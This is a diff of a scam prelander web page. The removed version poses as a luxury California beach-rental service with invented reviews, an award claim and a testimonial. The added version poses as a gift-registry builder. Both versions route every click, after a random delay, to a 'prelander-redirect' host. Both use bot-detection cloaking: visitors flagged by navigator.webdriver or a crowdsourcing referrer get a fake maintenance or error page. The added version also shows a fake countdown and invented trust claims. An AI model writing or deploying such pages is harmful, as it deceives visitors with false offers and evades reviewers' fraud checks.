@@ -3,180 +3,157 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>California Coastal Living | Premium Beachfront Vacation Homes</title>
-    <meta name="description" content="Discover hand-picked luxury beach rentals along California's stunning coastline. Exclusive access to verified properties with 24/7 concierge service.">
-    
-    <!-- Google Translate -->
-    <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
-    <script>
-        function googleTranslateElementInit() {
-            new google.translate.TranslateElement({
-                pageLanguage: 'en',
-                includedLanguages: 'es,fr,de,zh-CN,ja',
-                layout: google.translate.TranslateElement.InlineLayout.SIMPLE
-            }, 'google_translate_element');
-        }
-    </script>
-
+    <title>Create Your Perfect Gift Registry | MyRegistry</title>
     <style>
-        :root {
-            --primary: #b85d34;
-            --secondary: #a64f28;
-        }
         body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            background: linear-gradient(to right, #ffecd2, #fcb69f);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f9fc;
+            color: #333;
             margin: 0;
             padding: 20px;
-            color: #333;
-            min-height: 100vh;
         }
         .container {
-            max-width: 800px;
-            margin: 2rem auto;
-            background: rgba(255,255,255,0.95);
-            padding: 2.5rem;
-            border-radius: 16px;
-            box-shadow: 0 12px 24px rgba(0,0,0,0.08);
-            backdrop-filter: blur(4px);
+            max-width: 720px;
+            margin: 0 auto;
+            text-align: center;
         }
-        h1 {
-            color: var(--primary);
-            font-size: 2.4rem;
-            margin-bottom: 1.5rem;
-            line-height: 1.2;
-        }
-        .trust-badges {
-            display: flex;
-            gap: 1rem;
-            justify-content: center;
-            flex-wrap: wrap;
-            margin: 2rem 0;
-        }
-        .badge {
-            background: rgba(255,255,255,0.9);
-            padding: 0.8rem 1.5rem;
-            border-radius: 50px;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.05);
-            font-size: 0.9rem;
+        .banner-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 15px;
+            margin: 25px 0;
         }
         .cta-button {
-            display: inline-block;
-            background: var(--primary);
-            color: #fff !important;
-            padding: 1.2rem 2.5rem;
-            border-radius: 8px;
+            display: none; /* Start hidden */
+            background-color: #005caa;
+            color: #fff;
+            padding: 14px 30px;
+            margin: 25px 0;
+            font-size: 18px;
+            border-radius: 5px;
             text-decoration: none;
-            font-weight: 600;
-            transition: all 0.3s ease;
-            margin: 2rem 0;
-            border: 2px solid var(--secondary);
+            font-weight: bold;
+            transition: opacity 0.3s;
         }
-        .cta-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(184,93,52,0.3);
+        .processing {
+            opacity: 0.7;
+            cursor: not-allowed;
         }
-        .features-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 1.5rem;
-            margin: 2rem 0;
+        .loader {
+            display: none;
+            width: 25px;
+            height: 25px;
+            border: 3px solid #fff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
         }
-        .feature-card {
-            padding: 1.5rem;
-            background: rgba(255,255,255,0.9);
-            border-radius: 8px;
-            text-align: left;
+        .countdown-container {
+            margin: 25px 0;
+            font-size: 1.1em;
+            color: #666;
         }
-        #google_translate_element {
-            position: absolute;
-            top: 15px;
-            right: 15px;
+        #countdown {
+            color: #d9534f;
+            font-weight: bold;
+            font-size: 1.3em;
+            display: block;
+            margin-top: 10px;
         }
-        .goog-te-banner-frame { display: none !important; }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
-    <div id="google_translate_element"></div>
     <div class="container">
-        <h1>Experience California's Finest Beachfront Properties</h1>
-        
-        <div class="trust-badges">
-            <div class="badge">⭐ 4.9/5 Guest Reviews</div>
-            <div class="badge">🔒 Secure Booking</div>
-            <div class="badge">🏆 Luxury Travel Award 2024</div>
+        <h1>Build Your Dream Gift Registry</h1>
+        <p>Create a personalized registry in minutes - add gifts from any store worldwide!</p>
+
+        <div class="banner-grid">
+            <a href="#redirect" class="partner-banner" onclick="handleBannerClick(event)">
+                <img src="https://static.shareasale.com/image/38014/mr_affiliate_xmas4_2021.gif" alt="Gift Registry Example" style="width:100%">
+            </a>
+            <a href="#redirect" class="partner-banner" onclick="handleBannerClick(event)">
+                <img src="https://static.shareasale.com/image/38014/mr_affiliate_xmas2_2021.jpg" alt="Registry Benefits" style="width:100%">
+            </a>
         </div>
 
-        <div class="features-grid">
-            <div class="feature-card">
-                <h3>🌊 Ocean View Retreats</h3>
-                <p>Private beach access with panoramic Pacific views in Malibu, Laguna, and Santa Barbara</p>
-            </div>
-            <div class="feature-card">
-                <h3>🛎️ Concierge Service</h3>
-                <p>24/7 personal assistance from local experts for dining, activities, and transportation</p>
-            </div>
-            <div class="feature-card">
-                <h3>🏡 Fully Equipped Homes</h3>
-                <p>Premium amenities including chef's kitchens, smart home systems, and private pools</p>
-            </div>
+        <div class="countdown-container">
+            <p>Registry builder unlocking in:</p>
+            <span id="countdown"></span>
+            <small>Verifying availability in your region...</small>
         </div>
 
-        <p style="text-align: center; font-size: 1.1rem;">
-            "Our family found the perfect Coronado Island retreat through this service - truly unforgettable!"
-            <br>- The Thompson Family, Chicago
-        </p>
+        <a href="#redirect" class="cta-button" onclick="handleCtaClick(event)">
+            <span class="button-text">Start Free Registry</span>
+            <div class="loader"></div>
+        </a>
 
-        <a href="#redirect" class="cta-button" id="mainCTA">Check Real-Time Availability</a>
-
-        <div class="legal-disclaimer">
-            <p style="font-size: 0.85rem; color: #666; text-align: center;">
-                By continuing, you agree to our <a href="/terms" style="color: var(--primary);">Terms of Service</a> 
-                and acknowledge our <a href="/privacy" style="color: var(--primary);">Privacy Policy</a>. 
-                <br>Message and data rates may apply. SSL secured connection.
-            </p>
+        <div class="note">
+            <p>Trusted by over 2 million users worldwide • SSL Secure • No Credit Card Required</p>
         </div>
     </div>
 
-    <!-- Anti-Fraud Scripts -->
     <script>
-        // Randomized delay redirect
-        document.getElementById('mainCTA').addEventListener('click', function(e) {
-            e.preventDefault();
-            this.innerHTML = 'Checking Coastal Properties...';
-            
-            setTimeout(() => {
-                window.location.href = 'https://prelander-redirect-2.vercel.app';
-            }, Math.random() * 3000 + 1500);
-        });
+        // Random countdown timer (40-79 seconds)
+        let countdownTime = Math.floor(Math.random() * 40) + 40;
+        const countdownElement = document.getElementById('countdown');
+        const ctaButton = document.querySelector('.cta-button');
+        const countdownContainer = document.querySelector('.countdown-container');
 
-        // Browser validation
-        if (navigator.webdriver || 
-            window.outerWidth < 300 || 
-            document.referrer.includes('microworkers')) {
-            document.body.innerHTML = `
-                <div class="container">
-                    <h2>System Maintenance</h2>
-                    <p>We're currently upgrading our property database. Please check back later.</p>
-                </div>
-            `;
+        function updateCountdown() {
+            const minutes = Math.floor(countdownTime / 60);
+            const seconds = countdownTime % 60;
+            countdownElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+
+            if(countdownTime <= 0) {
+                ctaButton.style.display = 'inline-block';
+                countdownContainer.style.display = 'none';
+                return;
+            }
+
+            countdownTime--;
+            setTimeout(updateCountdown, 1000);
         }
 
-        // Cookie-based session tracking
-        document.cookie = "source=organic; path=/; SameSite=Lax";
-        document.cookie = `session_id=${Math.random().toString(36).substr(2)}; path=/`;
-    </script>
+        // Initialize countdown
+        updateCountdown();
 
-    <!-- Google Analytics -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-3DCX56R2GN"></script>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag(){dataLayer.push(arguments);}
-        gtag('js', new Date());
-        gtag('config', 'G-3DCX56R2GN', {
-            'page_title': 'California Beach Rentals',
-            'page_path': '/luxury-properties',
-            'referrer': document.referrer || 'https://www.google.com'
+        // Original code below
+        const getRandomDelay = () => Math.floor(Math.random() * 3000) + 2000;
+
+        const showLoader = (element) => {
+            element.classList.add('processing');
+            element.querySelector('.loader').style.display = 'block';
+            element.querySelector('.button-text').style.visibility = 'hidden';
+        };
+
+        const handleRedirect = (element) => {
+            showLoader(element);
+            setTimeout(() => {
+                window.location.href = 'https://prelander-redirect-2.vercel.app?ref=' + 
+                    Math.random().toString(36).substring(7);
+            }, getRandomDelay());
+        };
+
+        const handleCtaClick = (e) => {
+            e.preventDefault();
+            handleRedirect(e.currentTarget);
+        };
+
+        const handleBannerClick = (e) => {
+            e.preventDefault();
+            handleRedirect(e.currentTarget);
+        };
+
+        if(navigator.webdriver || window.outerWidth === 0) {
+            document.body.innerHTML = '<h2>Please enable JavaScript to continue</h2>';
+        }
+
+        document.addEventListener('click', () => {
+            localStorage.setItem('lastInteraction', Date.now());
         });
     </script>
 </body>
